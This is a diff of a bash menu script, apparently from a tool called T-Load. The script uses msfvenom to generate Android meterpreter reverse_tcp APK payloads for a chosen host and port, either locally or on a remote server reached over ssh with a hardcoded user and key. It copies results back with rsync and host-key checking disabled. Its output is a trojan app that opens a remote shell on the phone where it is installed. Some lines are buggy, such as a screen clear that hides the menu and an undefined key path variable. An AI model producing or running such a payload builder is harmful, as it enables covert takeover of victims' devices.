@@ -1,15 +1,57 @@
 trap '' INT TSTP
+source $HOME/T-Load/host
 metapath="$HOME/metasploit-framework"
 clear
-cd $metapath
+#############
+# Details
+#############
 echo "Enter HOST"
 read -p ">|" host1
+echo ""
 echo "Enter PORT"
 read -p ">|" port1
+echo ""
+echo "Select payload generation option"
+echo "1. Create Payload from your device"
+echo "2. Create Payload from server (Avoids Errors)"
+clear
+read -p ">|" cp
+
+###########
+# Local
+###########
+if [ $cp == "1" ]
+then
+echo ""
 echo "Please enter the complete path with .apk extension"
-echo "where you want to save the payload to"
+echo "Where you want to save the payload"
 read -p ">|" p2
+cd $metapath
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 --platform android --arch dalvik R > $p2
 cd ..
 sleep 3
 tload
+###########
+
+###########
+# Server
+###########
+elif [ $cp == "2" ]
+then
+echo "Enter app name with .apk extention"
+read -p ">|" cpname
+echo ""
+echo "Please enter the complete path WITHOUT INCLUDING app name"
+echo "where you want to save the payload"
+read -p ">|" dpath
+ssh -i $dir/key sathvik@$host -t "sudo cp.sh $host1 $port1 $cpname"
+rsync -r -v --progress -e "ssh -i $HOME/T-Load/key -o StrictHostKeyChecking=no" sathvik@$host:/home/sathvik/cpayload/$cpname $dpath
+###########
+
+else 
+echo "Wrong choice"
+sleep 2
+reload=$(readlink -f "$0")
+exec "$reload"
+
+fi
